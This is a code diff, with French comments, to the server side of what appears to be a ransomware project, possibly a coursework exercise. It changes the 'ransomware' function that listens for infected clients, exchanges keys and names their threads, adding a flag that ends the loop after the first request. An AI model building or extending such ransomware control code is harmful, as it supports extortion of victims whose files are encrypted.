@@ -24,19 +24,26 @@ def Serveur_cles(FIFO, FIFO_RESP):
 
 def ransomware(FIFO, PORT):
     indicateur = False
+    dead = False
     socket_serv = net.start_net_serv_client(port=PORT)
     FIFO_resp = queue.Queue()
     THREADS_QUEUE.append(FIFO_resp)
-    id_thread = len(THREADS_QUEUE) - 1
+    id_thread_list = len(THREADS_QUEUE) - 1
+    id_thread = id_thread_list
     print('Ouverture d\'une écoute sur le port', PORT)
 
     while True:
         conn, addr = socket_serv.accept()
         key = secu.Diffie_Hellman_exchange_key(conn)
-
+        if dead:
+            # supprimer la boucle infinie à la place?
+            # écrire dans le fichier CFG le nouveau port, comme ça un nouveau serveur peut s'ouvrir sur le premier port?
+            # (8443) en soit ça sert à rien, c'est juste pour proposer quelque chose de pratique et intéressant...
+            break
         if not indicateur:
             FIFO.put("{RANSOMWARE_REQ: None}")
             indicateur = True
+            dead = True
         print(
             f'[+] Connexion établie sur le Thread Ransomware-{id_thread} sur l\'adresse {conn.getsockname()[0]}:'
             f'{conn.getsockname()[1]}\n')
@@ -57,7 +64,7 @@ def ransomware(FIFO, PORT):
                 net.send_message(conn, data_encrypted)
                 if message.get_message_type(data) == 'INITIALIZE_RESP':
                     # Permet d'authentifier en local le ransomware
-                    ransomware_threads[id_thread].setName('Ransomware-' + str(data['CONFIGURE']))
+                    ransomware_threads[id_thread_list].setName('Ransomware-' + str(data['CONFIGURE']))
                     id_thread = data['CONFIGURE']
                     break
 
